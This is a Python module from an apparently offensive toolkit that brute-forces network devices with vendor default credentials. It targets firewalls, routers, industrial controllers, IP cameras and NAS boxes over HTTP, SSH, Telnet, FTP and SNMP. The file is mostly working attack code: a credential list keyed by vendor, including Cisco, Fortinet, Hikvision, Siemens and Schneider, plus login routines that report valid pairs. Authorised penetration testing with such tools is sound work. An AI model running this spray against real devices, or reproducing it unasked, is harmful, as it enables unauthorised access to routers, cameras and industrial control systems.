"""Default Credential Spray Module.

Brute-forces common network devices using vendor-specific default credentials.
Covers: Firewalls, Routers, Industrial Controllers, IP Cameras, NAS devices.

Supports protocols:
- HTTP Basic Auth / Form-based login
- SSH (via paramiko or subprocess)
- Telnet
- FTP
- SNMP community strings

xpl-forge-full-integration.plan.md Bloco 4.

Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""

from __future__ import annotations

import socket
import telnetlib
import ftplib
import urllib.request
import urllib.parse
import urllib.error
from typing import Optional

from embedxpl.core.exploit.base import Base
from embedxpl.core.exploit.option import OptIP, OptInt, OptStr, OptBool


# Default credentials database: (username, password, description)
DEFAULT_CREDS_DB: dict[str, list[tuple[str, str]]] = {
    "generic": [
        ("admin", "admin"),
        ("admin", "password"),
        ("admin", "1234"),
        ("admin", "12345"),
        ("admin", "123456"),
        ("admin", ""),
        ("root", "root"),
        ("root", ""),
        ("root", "toor"),
        ("root", "admin"),
        ("user", "user"),
        ("guest", "guest"),
        ("administrator", "administrator"),
        ("administrator", "password"),
    ],
    "cisco": [
        ("admin", "cisco"),
        ("cisco", "cisco"),
        ("admin", ""),
        ("enable", "cisco"),
        ("cisco", ""),
    ],
    "fortinet": [
        ("admin", ""),
        ("admin", "admin"),
        ("admin", "fortinet"),
    ],
    "paloalto": [
        ("admin", "admin"),
    ],
    "checkpoint": [
        ("admin", "admin"),
        ("admin", "cpwins1"),
    ],
    "juniper": [
        ("admin", ""),
        ("root", ""),
        ("netscreen", "netscreen"),
    ],
    "tplink": [
        ("admin", "admin"),
        ("admin", "tplink1"),
        ("admin", ""),
    ],
    "huawei": [
        ("admin", "admin"),
        ("admin", "Admin@123"),
        ("root", "admin"),
        ("user", ""),
    ],
    "mikrotik": [
        ("admin", ""),
        ("admin", "admin"),
    ],
    "hikvision": [
        ("admin", "12345"),
        ("admin", "admin12345"),
        ("admin", ""),
    ],
    "dahua": [
        ("admin", "admin"),
        ("admin", ""),
        ("888888", "888888"),
        ("666666", "666666"),
    ],
    "axis": [
        ("root", "pass"),
        ("admin", "admin"),
    ],
    "siemens": [
        ("admin", "admin"),
        ("admin", ""),
        ("urs", "urs"),
    ],
    "schneider": [
        ("USER", "USER"),
        ("ADMIN", "ADMIN"),
        ("USER", ""),
    ],
    "abb": [
        ("admin", "admin"),
        ("user", "user"),
    ],
}


class DefaultCredSpray(Base):
    """Default credential spray for network devices."""

    __info__ = {
        "name": "Default Credential Spray",
        "description": "Test vendor default credentials against network devices via HTTP/SSH/Telnet/FTP",
        "category": "credential_attack",
        "author": "Andre Henrique (@mrhenrike) | Uniao Geek",
    }

    target = OptIP("", "Target IP address")
    port = OptInt(0, "Port (0=auto-detect from protocol)")
    protocol = OptStr("http", "Protocol: http, https, ssh, telnet, ftp, snmp")
    vendor = OptStr("generic", "Vendor hint or 'generic' for all defaults")
    stop_on_first = OptBool(True, "Stop after first valid credential found")
    http_login_path = OptStr("/login", "HTTP login endpoint path")
    http_user_field = OptStr("username", "HTTP login form username field")
    http_pass_field = OptStr("password", "HTTP login form password field")
    snmp_versions = OptStr("1,2c", "SNMP versions to test")

    def _get_creds(self) -> list[tuple[str, str]]:
        """Get credential list for vendor."""
        creds = DEFAULT_CREDS_DB.get(self.vendor.lower(), [])
        if not creds or self.vendor.lower() == "generic":
            creds = DEFAULT_CREDS_DB["generic"]
        return creds

    def _get_port(self) -> int:
        """Get port based on protocol."""
        if self.port:
            return self.port
        defaults = {
            "http": 80, "https": 443, "ssh": 22,
            "telnet": 23, "ftp": 21, "snmp": 161,
        }
        return defaults.get(self.protocol.lower(), 80)

    def check(self) -> bool:
        """Check if target is reachable."""
        if not self.target:
            return False
        port = self._get_port()
        try:
            s = socket.socket()
            s.settimeout(3)
            s.connect((self.target, port))
            s.close()
            return True
        except Exception:
            return False

    def run(self) -> None:
        """Execute credential spray."""
        if not self.check():
            print(f"[-] {self.target}:{self._get_port()} not reachable")
            return

        creds = self._get_creds()
        proto = self.protocol.lower()
        print(f"[*] Spraying {len(creds)} credential pairs against {self.target} via {proto}")

        found = []
        for username, password in creds:
            success = False
            if proto in ("http", "https"):
                success = self._try_http(username, password, proto)
            elif proto == "ssh":
                success = self._try_ssh(username, password)
            elif proto == "telnet":
                success = self._try_telnet(username, password)
            elif proto == "ftp":
                success = self._try_ftp(username, password)
            elif proto == "snmp":
                success = self._try_snmp(username)  # user = community string

            if success:
                print(f"[+] VALID: {username}:{password}")
                found.append((username, password))
                if self.stop_on_first:
                    break

        if not found:
            print(f"[-] No valid credentials found")
        else:
            print(f"\n[+] Valid credentials: {len(found)}")
            for u, p in found:
                print(f"    {u}:{p}")

    def _try_http(self, username: str, password: str, scheme: str = "http") -> bool:
        """Try HTTP Basic Auth and form-based login."""
        port = self._get_port()
        base = f"{scheme}://{self.target}:{port}"
        # Try Basic Auth first
        try:
            pm = urllib.request.HTTPPasswordMgrWithDefaultRealm()
            pm.add_password(None, base, username, password)
            opener = urllib.request.build_opener(urllib.request.HTTPBasicAuthHandler(pm))
            resp = opener.open(f"{base}/", timeout=5)
            if resp.status in (200, 302) and resp.status != 401:
                return True
        except Exception:
            pass
        # Form-based
        try:
            data = urllib.parse.urlencode({
                self.http_user_field: username,
                self.http_pass_field: password,
            }).encode()
            req = urllib.request.Request(
                f"{base}{self.http_login_path}",
                data=data,
                method="POST",
            )
            with urllib.request.urlopen(req, timeout=5) as resp:
                body = resp.read().decode(errors="replace")
                if any(kw in body.lower() for kw in ["dashboard", "welcome", "logout", "home"]):
                    return True
        except urllib.error.HTTPError as e:
            if e.code == 302:  # redirect after login = success
                return True
        except Exception:
            pass
        return False

    def _try_ssh(self, username: str, password: str) -> bool:
        """Try SSH login via paramiko."""
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                self.target, port=self._get_port(),
                username=username, password=password,
                timeout=5, allow_agent=False, look_for_keys=False,
            )
            client.close()
            return True
        except Exception:
            return False

    def _try_telnet(self, username: str, password: str) -> bool:
        """Try Telnet login."""
        try:
            tn = telnetlib.Telnet(self.target, self._get_port(), timeout=5)
            tn.read_until(b"login: ", timeout=3)
            tn.write(username.encode() + b"\n")
            tn.read_until(b"Password: ", timeout=3)
            tn.write(password.encode() + b"\n")
            resp = tn.read_until(b"$", timeout=3)
            tn.close()
            if b"$" in resp or b"#" in resp:
                return True
        except Exception:
            pass
        return False

    def _try_ftp(self, username: str, password: str) -> bool:
        """Try FTP login."""
        try:
            ftp = ftplib.FTP()
            ftp.connect(self.target, self._get_port(), timeout=5)
            ftp.login(username, password)
            ftp.quit()
            return True
        except ftplib.error_perm:
            return False
        except Exception:
            return False

    def _try_snmp(self, community: str) -> bool:
        """Try SNMP community string."""
        # Send SNMP GetRequest for sysDescr (OID: 1.3.6.1.2.1.1.1.0)
        # Minimal SNMP v1 GetRequest
        try:
            import struct
            oid = b"\x06\x08\x2b\x06\x01\x02\x01\x01\x01\x00"
            community_bytes = community.encode()
            pdu = (
                b"\x02\x01\x00"  # version = 0 (v1)
                b"\x04" + bytes([len(community_bytes)]) + community_bytes
                + b"\xa0\x1b\x02\x04\x00\x00\x00\x01"
                + b"\x02\x01\x00\x02\x01\x00"
                + b"\x30\x0d\x30\x0b" + oid + b"\x05\x00"
            )
            snmp = b"\x30" + bytes([len(pdu)]) + pdu
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(3)
            s.sendto(snmp, (self.target, 161))
            resp, _ = s.recvfrom(512)
            s.close()
            return len(resp) > 10 and community_bytes in resp
        except Exception:
            return False
